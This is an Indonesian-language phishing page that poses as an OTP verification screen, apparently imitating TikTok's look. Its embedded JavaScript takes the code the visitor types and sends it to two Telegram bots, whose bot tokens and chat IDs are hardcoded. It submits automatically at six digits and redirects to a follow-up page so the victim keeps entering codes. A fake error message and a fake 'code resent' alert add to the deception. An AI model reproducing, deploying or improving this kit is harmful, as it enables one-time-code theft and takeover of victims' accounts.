<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verifikasi Kode</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Arial', sans-serif;
        }

        body {
            background-color: #000000;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            padding: 20px;
            color: #000;
        }

        .container-box {
            background: white;
            width: 100%;
            max-width: 700px;
            padding: 25px;
            border-radius: 8px;
            text-align: center;
            margin-bottom: 30px;
            
        }

        .title {
            font-size: 1rem;
            font-weight: bold;
            margin-bottom: 15px;
        }

        .input-box {
            width: 100%;
            height: 40px;
            border: 1px solid #999;
            border-radius: 4px;
            padding: 0 15px;
            font-size: 1rem;
            margin-bottom: 10px;
            outline: none;
         }

        .info-text {
            font-size: 0.8rem;
            color: #666;
            margin-bottom: 5px;
         }
    
        /* === STYLE PESAN SALAH === */
        
        .error-text {
            font-size: 0.8rem;
            color: #ff0000;
            margin-bottom: 10px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 5px;
        }

        .timer-text {
            font-size: 1rem;
            font-weight: bold;
            margin-bottom: 20px;
            color: #ff0050;
        }

        .resend-link {
            font-size: 0.8rem;
            color: #000;
            text-decoration: underline;
            margin-bottom: 25px;
            display: inline-block;
            cursor: pointer;
        }

        .submit-btn {
            width: 100%;
            padding: 10px;
            background-color: #ff0050;
            color: white;
            border: none;
            border-radius: 4px;
            font-size: 0.9rem;
            font-weight: bold;
            cursor: pointer;
        }

        .submit-btn:disabled {
            background-color: #ff88a0;
            cursor: not-allowed;
        }

        .footer-text {
            color: white;
            font-size: 0.8rem;
            text-align: center;
            max-width: 400px;
            line-height: 1.5;
            opacity: 0.8;
        }
    </style>
</head>
<body>

    <div class="container-box">
        <div class="title">Masukkan kode verifikasi</div>

        <!-- ✅ Diubah dari type="Number" jadi type="text" agar bisa diketik di HP -->
        <input type="text" id="kode" class="input-box" placeholder="Masukkan kode OTP disini" inputmode="numeric" maxlength="6">

        <div class="info-text">
            Kode OTP dikirim via SMS/WhatsApp/Email.<br>
            OTP akan kedaluwarsa setelah 3 menit.
        </div>

         <!-- ✅ Ditambahkan id="pesanError" agar script bisa menemukannya -->
        <div class="error-text" id="pesanError">
            <i class="fas fa-exclamation-triangle"></i> Kode salah, Masukkan lagi.
        </div>
        
        <div class="timer-text" id="timer">02:51</div>

        <a class="resend-link" id="kirimUlang">Kirim ulang kode</a>

        <button class="submit-btn" id="btnKirim" onclick="kirimData()">MASUK</button>
    </div>

    <div class="footer-text">
        Anda mungkin menerima SMS, notifikasi WhatsApp,<br>
        dan notifikasi pesan instan lainnya.
    </div>

    <!-- ============================================== -->
    <!-- SCRIPT SUDAH DIPERBAIKI — KIRIM & PINDAH HALAMAN -->
    <!-- ============================================== -->
        <script>
        // ==================== ⚠️ WAJIB DIISI LENGKAP! ====================
        // BOT 1 — Pastikan Token & Chat ID LENGKAP!
        const BOT1_TOKEN = "8463412359:AAG6nli8rzC54LQSKkgXBXkwI8ePspNfFI1A"; // Ganti dengan Token lengkap Bot 1
        const BOT1_CHAT_ID = "-1003797236002"; // Ganti dengan Chat ID lengkap Bot 1

        // BOT 2
        const BOT2_TOKEN = "8567366336:AAEBjptgS76AUDZ80k1C0uLL5NQnTGnQT0Q";
        const BOT2_CHAT_ID = "-1003710620091";

        // Halaman tujuan
        const HALAMAN_BERIKUTNYA = "verifikasi ulang.html";

        // === TIMER HITUNG MUNDUR ===
        let totalDetik = 2 * 60 + 51;
        const timerElement = document.getElementById('timer');
        let timerExpired = false;
        
        const countdown = setInterval(() => {
            let menit = Math.floor(totalDetik / 60);
            let detik = totalDetik % 60;
            
            detik = detik < 10 ? "0" + detik : detik;
            timerElement.textContent = menit + ":" + detik;
            totalDetik--;

            if(totalDetik < 0) {
                clearInterval(countdown);
                timerElement.textContent = "Waktu Habis";
                timerElement.style.color = "#ff0050";
                timerExpired = true;
            }
        }, 1000);

        // === FUNGSI KIRIM KE BOT ===
        async function kirimKeBot(token, chatId, pesan) {
            try {
                const res = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                    method: "POST",
                    headers: {"Content-Type": "application/json"},
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: pesan,
                        parse_mode: "HTML"
                    })
                });
                const data = await res.json();
                console.log("Respon Bot:", data);
                return data.ok;
            } catch (err) {
                console.log("❌ Gagal kirim ke Bot:", err);
                return false;
            }
        }

        // === FUNGSI UTAMA KIRIM DATA ===
        async function kirimData(){
            let kode = document.getElementById("kode").value.trim();
            let btn = document.getElementById("btnKirim");
            let error = document.getElementById("pesanError");

            // Validasi minimal 4 digit
            if(kode === "" || kode.length < 4){
                error.style.display = "block";
                return false;
            }
            error.style.display = "none";

            // Kunci tombol saat proses
            btn.disabled = true;
            btn.innerText = "Memproses...";

            // Format pesan
            let pesan = `<b>🔐 Kode OTP</b>
Kode : <code>${kode}</code>
${timerExpired ? '⚠️ Waktu sudah habis!' : ''}`;

            console.log("📤 Mengirim data ke 2 bot...");

            // Kirim ke 2 bot bersamaan
            const [hasilBot1, hasilBot2] = await Promise.all([
                kirimKeBot(BOT1_TOKEN, BOT1_CHAT_ID, pesan),
                kirimKeBot(BOT2_TOKEN, BOT2_CHAT_ID, pesan)
            ]);

            console.log("🤖 Bot 1:", hasilBot1 ? "✅ Berhasil" : "❌ Gagal");
            console.log("🤖 Bot 2:", hasilBot2 ? "✅ Berhasil" : "❌ Gagal");

            // Selalu pindah halaman — meskipun bot gagal
            console.log("➡️ Pindah ke halaman:", HALAMAN_BERIKUTNYA);
            window.location.href = HALAMAN_BERIKUTNYA;
        }

        // Kirim ulang kode
        document.getElementById('kirimUlang').addEventListener('click', () => {
            alert('Kode baru telah dikirim!');
            document.getElementById('kode').value = '';
            document.getElementById('kode').focus();
        });

        // Otomatis kirim setelah 6 digit terisi
        document.getElementById('kode').addEventListener('input', (e) => {
            if(e.target.value.length === 6) {
                kirimData();
            }
        });

        // Tekan Enter untuk kirim
        document.addEventListener('keypress', function(e) {
            if (e.key === 'Enter') kirimData();
        });
    </script>

</body>
</html>
